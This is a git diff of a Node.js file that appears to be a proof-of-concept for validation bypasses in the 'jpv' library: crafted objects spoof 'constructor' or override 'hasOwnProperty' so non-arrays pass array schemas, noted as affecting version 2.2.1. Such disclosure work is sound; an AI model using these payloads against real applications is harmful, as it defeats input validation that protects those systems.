@@ -1,23 +1,24 @@
 const express = require('express')
 const jpv = require('jpv')
 
-function checkJPVMap(input)
+function checkJPVMapOrig(input)
 {
 	var mapPattern = 
 	{
 		should_be_map: new Map()
 	}
-	/*
+
+	return ("Validation bypassed: " + jpv.validate(input, mapPattern));
+
+		/*
 	Debugging info
 	console.log(typeof(mapPattern))
 	console.log(mapPattern.constructor.name);
 	console.log(input.constructor.name)
 	*/
-
-	return ("Validation bypassed: " + jpv.validate(input, mapPattern));
 }
 
-function checkJPVArray(input)
+function checkJPVArrayOrig(input)
 {
 	var arrayPattern = {
 		should_be_arrary: []
@@ -43,7 +44,8 @@ function traverse(o,func) {
 
 function exampleJPV()
 {
-	var user_input = {
+	/*
+	const input = {
 		should_be_arrary: {"a":"1", 'constructor': {'name':'Array'}}
 	};
 
@@ -54,26 +56,67 @@ function exampleJPV()
 		should_be_arrary: []
 	};	
 	return ("Validation bypassed: " + jpv.validate(user_input, pattern));
+	*/
 
-	/* 
-	var jsonObject = 
-	{
-		fakeArray: {
-			random: "stuff",
-			constructor: [].constructor
+	
+	const input = {
+		anArray: {
+		  malicious: "problematic input.", 
+		  constructor: [].constructor
 		}
 	};
+
 	const schema = {
-		arraylookalike: []
+	  anArray: []
+	};
+	
+
+	/*
+	const input= {
+		key7: {"a":1},
+		"hasOwnProperty": (v)=>{return false;}
+	}
+	
+	var schema = {
+		key7: []
 	};
 	*/
-	
-	//return ("Validation is getting bypassed: " + jpv.validate(jsonObject, schema)); 
+
+
+	// jpv.validate(input, schema) should return false, but, as of 2.2.1, returns true
+	console.log("Validation is getting bypassed: " + jpv.validate(input, schema)); 
+	return jpv.validate(input, schema);
+
+}
+
+function constructorOverrideUpdated(input)
+{
+	const schema = {
+	  definitelyAnArray: []
+	};
+
+	return ("Validation bypassed: " + jpv.validate(input, schema));
+
+}
+
+function hasOwnPropertyOverride(input)
+{
+	var input= {
+		key7: {"a":1},
+		"hasOwnProperty": (v)=>{return false;}
+	}
+	var schema = {
+		key7: []
+	};
+
+	console.log("Validation is getting bypassed: " + jpv.validate(input, schema)); 
+	return jpv.validate(input, schema);
 
 }
 
 module.exports = {
-   checkJPVMap,
-   checkJPVArray,
+   checkJPVMapOrig,
+   checkJPVArrayOrig,
+   constructorOverrideUpdated,
    exampleJPV
 }
